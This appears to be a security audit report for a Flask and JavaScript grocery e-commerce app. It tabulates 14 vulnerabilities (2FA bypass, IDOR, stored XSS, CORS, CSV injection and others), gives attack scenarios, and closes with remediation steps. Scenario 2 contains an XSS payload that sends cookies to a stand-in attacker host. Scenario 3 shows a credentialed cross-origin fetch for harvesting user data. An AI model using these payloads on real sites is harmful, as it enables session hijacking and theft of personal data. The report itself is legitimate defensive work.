# E-GROSSARY — COMPLETE SECURITY AUDIT REPORT

## 1. Executive Summary

**Project Name:** e Grossary / e Grossary Mart  
**Repository Path:** `d:/mart/mart`  
**Architecture:** Decoupled Hybrid Web Application (Flask REST API + Vanilla ES6+ SPA)  
**Audit Scope:** Full Application Security Lifecycle (User, Browser, Frontend, API, Authentication, Authorization, Database, Storage, Business Logic, Third-Party Integrations, Logging, Deployment, Infrastructure)  
**Baseline Standard:** OWASP Top 10 (2021), OWASP API Security Top 10 (2023), OWASP ASVS v4.0.3, NIST SP 800-63B  

A comprehensive security assessment of the codebase was conducted prior to code modifications. The audit identified **14 distinct security vulnerabilities** ranging from Critical to Medium severity. Key systemic issues included a complete bypass of Two-Factor Authentication (2FA) for administrators accessing through customer or API login routes, Broken Object-Level Authorization (BOLA/IDOR) in payment processing, client-side Stored Cross-Site Scripting (XSS) in the Admin ERP console, unauthenticated wholesale cost price disclosures to public shoppers, and an overly permissive CORS configuration that allowed any arbitrary Vercel subdomain to make credentialed requests.

---

## 2. Security Vulnerability Findings Matrix

| ID | Vulnerability Description | Location | Severity | Impact | OWASP Mapping |
|---|---|---|---|---|---|
| **VULN-01** | **2FA Bypass on Admin Accounts via Alternate Login Endpoints** | `backend/routes/auth.py` (`customer_login`), `backend/routes/api/auth.py` (`api_login`) | 🔴 Critical | Admins with 2FA enabled can bypass TOTP checks entirely by authenticating via `/login` or `/api/auth/login`. | OWASP A07:2021 Identification & Auth Failures |
| **VULN-02** | **Broken Object-Level Authorization (BOLA/IDOR) on Checkout Payment** | `backend/routes/customer.py` (`create_checkout_session`) | 🔴 Critical | Authenticated users can generate Stripe payment sessions for any other customer's order without ownership checks. | OWASP API1:2023 Broken Object Level Authorization |
| **VULN-03** | **Order Status Tampering & Unverified Payment Fraud** | `backend/routes/customer.py` (`payment_success`) | 🔴 Critical | Orders could be marked 'Paid' without validating transaction amount, currency, or matching order ID in Stripe metadata. | OWASP A04:2021 Insecure Design |
| **VULN-04** | **Stored Cross-Site Scripting (XSS) in Admin ERP Console** | `frontend/static/js/admin.js`, `frontend/static/js/customer.js` | 🔴 Critical | Malicious registration, shipping address, or supplier details injected into DOM `innerHTML` execute arbitrary JS in admin session. | OWASP A03:2021 Injection |
| **VULN-05** | **Permissive Wildcard Regex in Credentialed CORS Configuration** | `backend/config.py`, `backend/__init__.py` | 🔴 Critical | `r"^https:\/\/.*\.vercel\.app$"` permitted any arbitrary third-party site on Vercel to issue credentialed cross-origin requests. | OWASP A05:2021 Security Misconfiguration |
| **VULN-06** | **Confidential Wholesale Pricing & Margin Data Leakage** | `database/models/product.py`, `backend/routes/api/products.py`, `customer.py` | 🟠 High | Wholesale `cost_price`, supplier name, and profit margins exposed to unauthenticated public visitors in product dictionaries. | OWASP A01:2021 Broken Access Control |
| **VULN-07** | **Insecure File Upload Validation (Extension-Only Check)** | `backend/utils/files.py`, `backend/routes/admin/products.py`, `storage_service.py` | 🟠 High | Upload verification relied solely on file extensions; lacked magic-byte verification, permitting disguised executable uploads. | OWASP A04:2021 Insecure Design |
| **VULN-08** | **Missing Rate Limiting on Sensitive API Endpoints** | `backend/routes/api/auth.py`, `backend/routes/security.py`, `backend/routes/api/orders.py` | 🟠 High | Sensitive login, registration, TOTP verification, and checkout endpoints lacked request throttling. | OWASP API4:2023 Unrestricted Resource Consumption |
| **VULN-09** | **Unrestricted Store Credit (Udhar) Checkout Abuse** | `backend/routes/customer.py`, `backend/services/order_service.py` | 🟠 High | Any new or untrusted customer could choose `UDHAR` at checkout without credit approval, obtaining items without payment. | OWASP A04:2021 Insecure Design |
| **VULN-10** | **Perpetual Password Reset Tokens** | `database/models/user.py`, `backend/routes/security.py` | 🟠 High | Password reset tokens possessed no expiration timestamp, remaining valid indefinitely until consumed. | OWASP A07:2021 Identification & Auth Failures |
| **VULN-11** | **CSV Formula Injection in Admin Sales Export** | `backend/services/export_service.py` (`generate_sales_csv`) | 🟡 Medium | Product names beginning with formula characters (`=`, `+`, `-`, `@`) executed commands when opened in Microsoft Excel. | OWASP A03:2021 Injection |
| **VULN-12** | **Broken Checkout API Method & Unhandled Exceptions** | `backend/routes/api/orders.py`, `backend/routes/admin/sales.py` | 🟡 Medium | Missing `OrderService.create_order_from_cart` method and missing `url_for` import caused 500 crashes during checkout. | OWASP A05:2021 Security Misconfiguration |
| **VULN-13** | **Permissive Content Security Policy (CSP)** | `backend/core/hooks.py` (`set_security_headers`) | 🟡 Medium | `img-src *` permitted arbitrary image exfiltration; HSTS header was missing from production responses. | OWASP Secure Headers Guidance |
| **VULN-14** | **Client-Side Admin Role Assumption in Frontend** | `frontend/static/js/admin.js` | 🟡 Medium | Frontend relied on `localStorage.getItem('jg_auth_user')` without validating active session against `/api/auth/me`. | OWASP A01:2021 Broken Access Control |

---

## 3. Detailed Attack Scenarios

### Scenario 1: Administrative 2FA Bypass
```text
Attacker (Possesses Admin Credentials via Credential Stuffing)
   ↓
Sends POST request to /api/auth/login or /login
   ↓
Vulnerable Component: backend/routes/api/auth.py / backend/routes/auth.py
   ↓
Security Failure: Endpoint checks password_hash, but omits user.two_factor_enabled check
   ↓
login_user(admin) executed; session cookie issued
   ↓
Impact: Complete bypass of 2FA; unauthorized administrative access to retail ERP
```

### Scenario 2: Stored XSS leading to Session Hijacking
```text
Attacker (Registers as customer with full_name = "<img src=x onerror=fetch('https://attacker.site/'+document.cookie)>")
   ↓
Stored in database users table
   ↓
Admin opens ERP Console at /admin/console -> Customers tab
   ↓
Vulnerable Component: frontend/static/js/admin.js (renderCustomers)
   ↓
Security Failure: DOM innerHTML directly interpolates c.name without HTML escaping
   ↓
Script executes within the Administrator's browser context
   ↓
Impact: Administrative session token exfiltration and complete ERP compromise
```

### Scenario 3: Cross-Origin Credentialed Data Harvesting via Wildcard CORS
```text
Attacker (Creates https://attacker-app.vercel.app)
   ↓
Attacker entices authenticated customer to visit malicious page
   ↓
Malicious page executes fetch('https://glossary-mart.onrender.com/api/auth/me', {credentials: 'include'})
   ↓
Vulnerable Component: backend/config.py (regex: ^https:\/\/.*\.vercel\.app$)
   ↓
Security Failure: Access-Control-Allow-Origin reflects attacker's domain with Access-Control-Allow-Credentials: true
   ↓
Impact: Full exfiltration of user PII, address, order history, and store credit balance
```

---

## 4. Remediation Architecture & Guidelines

1. **Strict 2FA Enforcement**: Route all logins through an unauthenticated staging session if 2FA is active. Issue full session cookies only upon valid TOTP verification.
2. **Server-Side Authorization**: Enforce `order.user_id == current_user.id` on every order interaction.
3. **Defense-in-Depth Output Sanitization**: HTML-escape all dynamic data rendered in browser DOMs; sanitize CSV fields against spreadsheet formula injection.
4. **Strict Allowlist CORS**: Whitelist only the legitimate production frontend and exact project preview domains.
5. **Data Minimization**: Remove confidential commercial metrics (`cost_price`, `profit_margin`, `supplier_name`) from public product and order serializers.
